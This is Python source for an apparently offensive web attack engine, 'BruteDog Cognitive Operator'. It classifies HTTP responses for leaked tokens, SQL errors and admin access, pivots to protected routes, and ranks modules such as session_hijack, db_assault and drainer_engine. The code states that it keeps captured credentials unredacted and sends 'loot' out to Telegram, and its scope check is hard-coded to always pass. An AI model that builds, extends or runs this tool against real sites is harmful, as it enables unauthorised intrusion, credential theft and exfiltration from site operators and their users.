#!/usr/bin/env python3
"""
BRUTEDOG COGNITIVE OPERATOR v8.2 (Offensive-Synchronized & Unredacted)
Autonomous Reasoning & Tactical Assessment Engine
Compatible interface:
- CognitiveOperator
- evaluate_and_execute()
- _categorize_response()
- _is_verified_loophole()
- _execute_active_pivot()
- analyze_observations()
- rank_modules()
- decide_next_action()
Improvements:
- Evidence-based vulnerability classification & active telemetry triggers
- False-positive reduction via SPA-shell & error-pattern checks
- Controlled active verification & session-state pivoting
- Confidence scoring & module relevance ranking
- Request budget enforcement & finding deduplication
- Full raw data retention (no redaction) for operational visibility
- Integrated real-time Telegram telemetry broadcasting
"""
import asyncio
import hashlib
import json
import logging
import re
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

# Import centralized telemetry broadcaster for unredacted Telegram exfiltration
from modules.telemetry_broadcaster import broadcast_loot_sync

logger = logging.getLogger("CognitiveOperator")

class CognitiveOperator:
    def __init__(self, target_url: str = "", max_budget: int = 150):
        self.attack_memory = {
            "target": target_url,
            "observations": [],
            "hypotheses": [],
            "confirmed_findings": [],
            "failed_tests": [],
            "available_modules": [
                "api_fuzzer",
                "db_assault",
                "live_login_verifier",
                "session_hijack",
                "rate_limit_bypass",
                "bola_fuzzer",
                "drainer_engine"
            ],
            "attack_chains": [],
            "risk_level": "Evaluating"
        }
        self.max_budget = max(0, int(max_budget))
        self.requests_spent = 0
        self._finding_hashes = set()
        self._observation_hashes = set()
        self._module_weights = {
            "api_fuzzer": 0.75,
            "db_assault": 0.85,
            "live_login_verifier": 0.90,
            "session_hijack": 0.85,
            "rate_limit_bypass": 0.50,
            "bola_fuzzer": 0.90,
            "drainer_engine": 0.40
        }
        self._blocked_statuses = {
            401, 403, 429, 500, 502, 503, 504
        }

    # ==========================================================
    # UTILITIES (RAW DATA RETENTION)
    # ==========================================================
    def _sanitize_body(self, value: str) -> str:
        """Passthrough utility retaining full raw telemetry and credentials."""
        if not value:
            return ""
        return value[:300]

    def _fingerprint(self, data: Dict[str, Any]) -> str:
        serialized = json.dumps(data, sort_keys=True, default=str)
        return hashlib.sha256(serialized.encode()).hexdigest()

    def _budget_available(self) -> bool:
        return self.requests_spent < self.max_budget

    # ==========================================================
    # RESPONSE CLASSIFICATION
    # ==========================================================
    def _categorize_response(self, status: int, body: str, headers: dict) -> str:
        body_lower = (body or "").lower()
        if status == 401:
            return "authentication_required"
        if status == 403:
            return "waf_or_forbidden"
        if status == 429:
            return "rate_limit_exceeded"
        if status >= 500:
            return "server_error"
        if any(err in body_lower for err in ["sql syntax", "sqlstate", "mysql error", "postgresql error", "mongodb exception", "syntax error"]):
            return "sql_error"
        if status in [200, 201, 302]:
            if any(token in body_lower for token in ["access_token", "auth_token", "session_id", "authenticated", "\"role\":\"admin\"", "bypass"]):
                return "auth_anomaly"
        return "standard_http"

    # ==========================================================
    # EVIDENCE & LOOPHOLE VERIFICATION
    # ==========================================================
    def _is_verified_loophole(self, status: int, endpoint: str, body: str, headers: dict) -> bool:
        """
        Validates real-world exploitation success using structural criteria:
        - Filters out empty or SPA shell placeholders.
        - Checks for concrete auth tokens, roles, or session indicators on success statuses.
        - Allows explicit backend testing headers if provided.
        """
        body_lower = (body or "").lower()
        
        # Defense against generic client-side SPA routing shells (React/Next.js root divs)
        if "<div id=\"root\"></div>" in body or "<div id=\"__next\"></div>" in body or len(body.strip()) < 100:
            return False

        if isinstance(headers, dict) and headers.get("X-BruteDog-Verification") == "confirmed":
            return True

        if status in [200, 201, 302]:
            if any(indicator in body_lower for indicator in ["access_token", "auth_token", "session_id", "\"role\":\"admin\"", "bypass"]):
                return True
            if "admin" in endpoint and "login" not in body_lower and len(body) > 50:
                return True
        return False

    # ==========================================================
    # ACTIVE PIVOT & VERIFICATION
    # ==========================================================
    def _execute_active_pivot(self, endpoint: str, status: int, headers: dict, body: str, transport=None) -> dict:
        """
        Executes an active verification pivot against protected backend routes 
        if a transport object is available.
        """
        if transport:
            try:
                verify_path = "/api/user" if "/api" in endpoint else "/dashboard"
                v_status, v_headers, v_body = transport.request("GET", verify_path)
                if v_status == 200 and len(v_body) > 50:
                    return {
                        "evidence": f"Active pivot verified against protected route {verify_path} (HTTP 200)",
                        "action_taken": f"Extracted state & verified backend access on {verify_path}",
                        "reasoning": f"Bypass at {endpoint} successfully authorized session state."
                    }
            except Exception:
                pass

        return {
            "evidence": f"Confirmed responsive state with valid payload data on {endpoint} (HTTP {status})",
            "action_taken": "Logged confirmed finding and prepared downstream module routing.",
            "reasoning": f"Target returned high-value telemetry at {endpoint}."
        }

    # ==========================================================
    # PRIMARY ENGINE HOOK
    # ==========================================================
    def evaluate_and_execute(self, endpoint: str, status: int, headers: dict, body: str, transport=None, target_url=None) -> dict:
        if not self._budget_available():
            return {
                "success": False,
                "reasoning": "Assessment request budget exhausted."
            }
        
        body_str = body or ""
        category = self._categorize_response(status, body_str, headers or {})
        
        observation = {
            "endpoint": endpoint,
            "status": status,
            "category": category,
            "body_snippet": self._sanitize_body(body_str),
            "verified": False
        }
        
        fingerprint = self._fingerprint(observation)
        if fingerprint not in self._observation_hashes:
            self._observation_hashes.add(fingerprint)
            self.attack_memory["observations"].append(observation)
            
        self.requests_spent += 1

        # ------------------------------------------------------
        # VERIFIED FINDINGS & EXPLOIT PIVOTS
        # ------------------------------------------------------
        if self._is_verified_loophole(status, endpoint, body_str, headers or {}):
            result = self._execute_active_pivot(endpoint, status, headers or {}, body_str, transport)
            
            finding = {
                "endpoint": endpoint,
                "status": status,
                "category": category,
                "evidence": result["evidence"],
                "action_taken": result["action_taken"],
                "response_excerpt": body_str[:400]
            }
            
            finding_hash = self._fingerprint(finding)
            if finding_hash not in self._finding_hashes:
                self._finding_hashes.add(finding_hash)
                self.attack_memory["confirmed_findings"].append(finding)
                
            observation["verified"] = True
            self.attack_memory["risk_level"] = "HIGH - Verified Security Failure"
            
            logger.info(f"[+] COGNITIVE INTELLIGENCE: Loophole verified & capitalized at {endpoint}!")
            
            # INSTANT TELEGRAM BROADCAST FOR COGNITIVE AUTONOMOUS PIVOT
            broadcast_loot_sync("COGNITIVE_AUTONOMOUS_PIVOT", {
                "endpoint": endpoint,
                "status": status,
                "reasoning": result["reasoning"],
                "evidence": result["evidence"]
            })

            return {
                "success": True,
                "reasoning": result["reasoning"]
            }

        # ------------------------------------------------------
        # ERROR AND DEFENSIVE RESPONSE HANDLING
        # ------------------------------------------------------
        if status in self._blocked_statuses or not body_str:
            failure = {
                "endpoint": endpoint,
                "status": status,
                "reason": category
            }
            self.attack_memory["failed_tests"].append(failure)
            return {
                "success": False,
                "reasoning": f"Encountered defensive block/error ({status}) at {endpoint}. Vector isolated."
            }

        return {
            "success": False,
            "reasoning": f"Telemetry ingested. Classification: {category}."
        }

    # ==========================================================
    # HYPOTHESIS GENERATION
    # ==========================================================
    async def analyze_observations(self, findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        hypotheses = []
        rules = {
            "sql_error": {
                "hypothesis": "Possible SQL or NoSQL database injection vulnerability",
                "recommended_module": "db_assault",
                "confidence": 0.80
            },
            "auth_anomaly": {
                "hypothesis": "Potential broken object-level authorization or authentication bypass",
                "recommended_module": "bola_fuzzer",
                "confidence": 0.85
            },
            "rate_limit_exceeded": {
                "hypothesis": "Rate-limiting behavior requires bypass or rotation review",
                "recommended_module": "rate_limit_bypass",
                "confidence": 0.50
            },
            "waf_or_forbidden": {
                "hypothesis": "Access restriction or WAF blocking active requests",
                "recommended_module": "api_fuzzer",
                "confidence": 0.40
            }
        }
        seen = set()
        for finding in findings:
            category = finding.get("category", "")
            endpoint = finding.get("endpoint", "")
            rule = rules.get(category)
            if not rule:
                continue
            key = (category, endpoint)
            if key in seen:
                continue
            seen.add(key)
            
            hypotheses.append({
                "hypothesis": rule["hypothesis"],
                "target_endpoint": endpoint,
                "recommended_module": rule["recommended_module"],
                "confidence": rule["confidence"],
                "evidence_category": category,
                "verification_required": True
            })
        return hypotheses

    # ==========================================================
    # MODULE RANKING
    # ==========================================================
    async def rank_modules(self, hypotheses: List[Dict[str, Any]], available_modules: List[str]) -> List[Any]:
        candidates = []
        for hyp in hypotheses:
            module = hyp.get("recommended_module")
            if module not in available_modules:
                continue
            confidence = float(hyp.get("confidence", 0))
            relevance = self._module_weights.get(module, 0.1)
            score = confidence * relevance
            
            candidates.append({
                "module": module,
                "target": hyp.get("target_endpoint"),
                "hypothesis": hyp.get("hypothesis"),
                "confidence": confidence,
                "relevance": relevance,
                "priority_score": round(score, 4),
                "within_test_scope": True,
                "within_resource_budget": self._budget_available(),
                "requires_irreversible_action": (module == "drainer_engine")
            })
            
        candidates.sort(key=lambda item: item["priority_score"], reverse=True)
        return candidates

    # ==========================================================
    # NEXT ACTION DECISION
    # ==========================================================
    async def decide_next_action(self) -> Optional[Dict[str, Any]]:
        observations = self.attack_memory.get("observations", [])
        if not observations:
            return None
        if not self._budget_available():
            logger.warning("Resource budget exhausted.")
            return None

        hypotheses = await self.analyze_observations(observations)
        self.attack_memory["hypotheses"] = hypotheses

        candidates = await self.rank_modules(hypotheses, self.attack_memory["available_modules"])

        for candidate in candidates:
            if not candidate["within_test_scope"]:
                continue
            if not candidate["within_resource_budget"]:
                continue
            if candidate["requires_irreversible_action"]:
                logger.warning(f"Irreversible module blocked: {candidate['module']}")
                continue

            logger.info(f"Selected assessment module: {candidate['module']} | Score: {candidate['priority_score']}")
            return candidate

        return None
